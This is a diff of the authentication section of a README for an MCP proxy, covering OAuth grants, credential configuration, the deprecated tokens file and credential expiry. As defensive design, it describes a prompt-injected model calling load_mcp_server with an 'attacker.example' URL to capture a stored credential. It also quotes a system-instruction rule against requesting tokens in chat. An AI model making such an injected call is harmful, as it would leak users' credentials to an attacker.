@@ -187,44 +187,70 @@ The config file uses the same `mcpServers` format as Claude Desktop, plus an opt
 
 ### Authentication
 
-Many MCP servers require credentials — OAuth Bearer tokens, PATs, API keys. extensible-mcp supports two paths, depending on how the downstream server is reached:
+Many MCP servers require credentials. How the proxy supplies one depends on how the downstream server is reached, and in every case the credential stays out of the LLM's context: the model never sees a token, a client secret or a key, and the proxy's system instructions tell it never to ask for one in the conversation.
 
 **Stdio servers** (launched as child processes via `command`) — pass credentials through the `env` block in `mcpServers`, the same way you would for any MCP server. The GitHub example in [`examples/`](examples/) uses this pattern with `$GITHUB_PERSONAL_ACCESS_TOKEN` resolved from a `.env` file or the proxy's environment.
 
-**URL servers** (Streamable HTTP via `url`) — drop a `tokens` file next to your config:
+**URL servers** (Streamable HTTP via `url`) — the proxy authenticates itself to an OAuth authorization server and is handed a short-lived access token, which lives only in memory. Declare the client identity once under `credentials`, then reference it by name from each server:
 
+```json
+{
+  "credentials": {
+    "corp-as": {
+      "grant": "private_key_jwt",
+      "token_endpoint": "https://as.example.com/oauth/token",
+      "client_id": "extensible-mcp-proxy",
+      "private_key_file": "keys/proxy-signing.pem"
+    },
+    "legacy-as": {
+      "grant": "client_credentials",
+      "token_endpoint": "https://legacy.example.com/oauth/token",
+      "client_id": "extensible-mcp-proxy",
+      "client_secret_env": "LEGACY_CLIENT_SECRET"
+    }
+  },
+  "mcpServers": {
+    "payments": {
+      "url": "https://payments.example.com/mcp",
+      "credential": "corp-as",
+      "scope": "payments.invoke",
+      "audience": "https://payments.example.com"
+    }
+  }
+}
 ```
-# tokens — gitignored by default
-notion=secret_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-internal-api=eyJhbGciOiJIUzI1NiIs...
-```
 
-Format: one `server_name=value` pair per line, `#` for comments, surrounding quotes on values are stripped. The proxy automatically picks up `tokens` if it exists in the same directory as the loaded config.
+Two grants ship. Both are the OAuth 2.0 `client_credentials` grant at the token endpoint; they differ in how the proxy proves it is the client:
 
-**Moving the tokens file outside the project.** If your setup includes a filesystem MCP server (or any other tool) that can read paths inside the project directory, the default `tokens` location is reachable by the agent. To keep credentials out of reach, set `EXTENSIBLE_MCP_TOKENS_FILE` to a path the agent can't see — e.g. `~/.secrets/extensible-mcp-tokens`. The variable can be set in the proxy's environment or in the `.env` file next to the config; relative paths are resolved relative to the config directory, and `~` is expanded. If the variable is set but the file doesn't exist, the proxy refuses to start. Without the variable, behavior is unchanged: the proxy looks for `tokens` next to the config and runs without one if it isn't there. The resolved path is logged at startup so you can confirm which file is in use.
+- `private_key_jwt` (RFC 7523) signs a short-lived assertion with a private key the authorization server never sees, so nothing replayable is transmitted or logged. It needs the `oauth` extra: `pip install "extensible-mcp[oauth]"`.
+- `client_credentials` sends a client secret, read from the environment variable named by `client_secret_env`. There is deliberately no `client_secret` field: the config file is one people commit and share, so a config carrying one is refused at load.
 
-**Tokens are only sent to URLs you configured.** A token is keyed by server name, but the URL a connection goes to is chosen by whoever opened it — and for a runtime `load_mcp_server`, that is the LLM. So a stored token is presented only when the connection's URL matches the one named for that server in the config file. A prompt-injected model calling `load_mcp_server("notion", "https://attacker.example/mcp")` gets no credential: the connection is attempted anonymously and, against a server that requires auth, simply fails. This means a server that needs a token must be in your config, not discovered at runtime.
+`scope` and `audience` belong to the server rather than the credential, because one OAuth client legitimately serves many resources. Relative paths such as `private_key_file` resolve against the config file's directory. The token is attached per request and refreshed in place when the downstream answers 401, so expiry is handled without a restart and without anyone editing a file.
 
-**Adding an authenticated server without restarting.** That rule would otherwise make "get a token, start using it" a restart, so the proxy ships an operator command:
+What this earns is *no replayable secret at rest*, not *no secret at rest*: `private_key_jwt` still keeps a private key on disk. A workload identity — a platform-attested, short-lived token exchanged at the authorization server — is the step past that, and is deliberately not built in, because every form of it is deployment-specific. The seam is there for it: a `CredentialProvider` is an object that returns a token, so "read the projected service-account token and exchange it" is another provider, written without touching the proxy.
+
+**No identity provider is required.** Nothing in the proxy needs Keycloak, Okta, Entra or any other authorization server unless you add a `credentials` entry pointing at one. A deployment of stdio servers, or of URL servers that need no credential, runs with none. (The Order Pizza demo's passkey page has its own built-in sign-in and does not use an external provider either.)
+
+**The tokens file, deprecated.** Before 0.3.5 the only path for a URL server was a `tokens` file next to the config — one `server_name=value` line per server, `#` for comments, surrounding quotes stripped — sent as `Authorization: Bearer <token>`. It still works: the proxy reads it if it exists (or at the path in `EXTENSIBLE_MCP_TOKENS_FILE`, for keeping it somewhere a filesystem tool cannot reach), reads it fresh on every connection so a rotated line takes effect without a restart, and logs one deprecation warning per process when it is used. It is deprecated because a bearer token on disk is a long-lived credential that stays valid until someone notices it has leaked, where a grant-acquired token is short-lived and never written anywhere. A server uses one path or the other: naming a `credential` for a server that also has a tokens-file line is refused at load, rather than settled by a silent precedence rule. Across servers the two can be mixed while you migrate.
+
+**A credential is only presented to a URL you configured.** A credential is keyed by server name, but the URL a connection goes to is chosen by whoever opened it — and for a runtime `load_mcp_server`, that is the LLM. So a credential is presented only when the connection's URL matches the one named for that server in the config file. A prompt-injected model calling `load_mcp_server("notion", "https://attacker.example/mcp")` gets no credential: the connection is attempted anonymously and, against a server that requires auth, simply fails. This means a server that needs a credential must be in your config, not discovered at runtime.
+
+**Adding an authenticated server without restarting.** That rule would otherwise make "get a credential, start using it" a restart, so a running proxy reloads its server list on `SIGHUP`: add the server (and, for the grant path, its `credentials` entry) to the config and signal the process, and it connects and indexes the new tools in place. For the bearer-token path the proxy also ships an operator command:
 
 ```bash
 # --token-stdin keeps the secret out of your shell history and the process list
 echo -n "$TOKEN" | extensible-mcp add-server --name notion --url https://notion.example/mcp --token-stdin
 ```
 
-It connects to the URL as an MCP client with that token and lists its tools, and *only if that works* writes the server into your config and the token into the tokens file (`0600`), then sends `SIGHUP` to a proxy already running against that config so it connects and indexes the new tools in place. If no proxy is running, the files are still written and the next start picks them up.
+It connects to the URL as an MCP client with that token and lists its tools, and *only if that works* writes the server into your config and the token into the tokens file (`0600`), then sends `SIGHUP` to a proxy already running against that config. If no proxy is running, the files are still written and the next start picks them up. It writes to the deprecated tokens file, and says so when it does; a credential acquired by grant is configured by hand as above.
 
 Verification matches the runtime exactly, including not following redirects — so a URL that redirects is reported here, with the URL to use instead, rather than passing the check and failing later at the proxy.
 
-It is a CLI command rather than an argument on `load_mcp_server` on purpose. The flaw it works around was the model *referencing a credential it had never seen*; passing the token in inverts that, so only a caller who already holds it can use it, and the model holds none. Putting a `token` parameter on the meta-tool would be safe from exfiltration for the same reason, but it shares the surface the model drives, and any user who pasted a token into a chat to make it work would break the rule that tokens never transit the conversation.
+It is a CLI command rather than an argument on `load_mcp_server` on purpose. The flaw it works around was the model *referencing a credential it had never seen*; passing the token in inverts that, so only a caller who already holds it can use it, and the model holds none. Putting a `token` parameter on the meta-tool would be safe from exfiltration for the same reason, but it shares the surface the model drives, and any user who pasted a token into a chat to make it work would break the rule that credentials never transit the conversation.
 
 An existing server name is never re-pointed: repointing a name at another host is the substitution the URL binding exists to prevent, so the command refuses and tells you to edit the config by hand if you really mean it.
 
-Tokens are sent as `Authorization: Bearer <token>` headers. The file is read fresh on every connection, so you can rotate credentials without restarting the proxy — overwrite the line, save, and the next request picks up the new value.
-
-extensible-mcp does **not** run an OAuth flow itself. If a server uses OAuth, mint the access token externally (CLI, browser flow, headless service-account auth, whatever you have) and drop it into the `tokens` file. Refresh is your responsibility.
-
-**Token expiry.** If a downstream call returns 401/403 (or an error message containing "unauthorized"/"forbidden"), the proxy translates it into a clear error to the LLM naming the server and reporting how long the token has been unchanged. The proxy's system instructions tell the LLM to ask the user to update the token in the `tokens` file and retry — never to request a token in the conversation. Tokens stay out of the chat transcript by design.
+**Credential expiry.** If a downstream call returns 401/403 (or an error message containing "unauthorized"/"forbidden") and the proxy cannot recover by acquiring a fresh token, it translates the failure into a clear error to the LLM naming the server and reporting how long the credential has been unchanged. The proxy's system instructions tell the LLM to ask the user to fix the credential and retry — never to request one in the conversation. Credentials stay out of the chat transcript by design.
 
 ### Filter pipelines
 
